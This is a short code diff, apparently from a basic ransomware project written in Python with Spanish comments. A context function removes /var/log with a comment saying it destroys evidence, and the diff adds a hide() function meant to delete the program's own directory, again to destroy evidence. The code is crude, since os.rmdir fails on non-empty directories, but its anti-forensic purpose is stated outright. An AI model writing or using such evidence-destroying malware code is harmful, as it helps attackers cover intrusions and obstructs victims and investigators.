@@ -53,3 +53,10 @@ def off_to_see_the_wizard():
     # ELIMINA TODOS LOS LOGS PARA DESTRUIR EVIDENCIA
     os.rmdir('/var/log')
     return True
+
+def hide():
+    # LA IDEA ES QUE SE AUTO ELIMINE PARA DESTRUIR EVIDENCIA
+    # ESTO SOLO FUNCIONA SI EL PROGRAMA QUEDA EJECUTANDOSE EN
+    # LA MEMORIA
+    os.rmdir('../Ransom-basic')
+    return True
